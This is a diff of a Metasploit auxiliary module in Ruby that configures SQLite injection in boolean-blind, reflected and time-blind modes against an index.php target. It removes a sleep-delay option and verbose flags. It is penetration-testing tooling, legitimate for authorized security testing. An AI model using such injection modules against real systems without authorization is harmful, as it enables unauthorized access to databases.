@@ -31,7 +31,6 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('SQLI_TYPE', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
         OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
         OptBool.new('HEX_ENCODE_STRINGS', [false, 'replace strings in the query with hex numbers?', false]),
-        OptFloat.new('SQLI_SLEEP', [true, 'The delay in time-based injections', 0.6])
       ]
     )
   end
@@ -39,7 +38,6 @@ class MetasploitModule < Msf::Auxiliary
   def boolean_blind
     encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = SQLitei::BooleanBasedBlind.new({
-      verbose: datastore['VERBOSE'],
       encoder: encoder,
       hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
     }) do |payload|
@@ -63,7 +61,6 @@ class MetasploitModule < Msf::Auxiliary
   def reflected
     encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = SQLitei::Common.new({
-      verbose: datastore['VERBOSE'],
       encoder: encoder,
       hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
     }) do |payload|
@@ -95,10 +92,8 @@ class MetasploitModule < Msf::Auxiliary
   def time_blind
     encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
     sqli = SQLitei::TimeBasedBlind.new({
-      verbose: datastore['VERBOSE'],
       encoder: encoder,
       hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
-      sleepdelay: datastore['SQLI_SLEEP']
     }) do |payload|
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'index.php'),
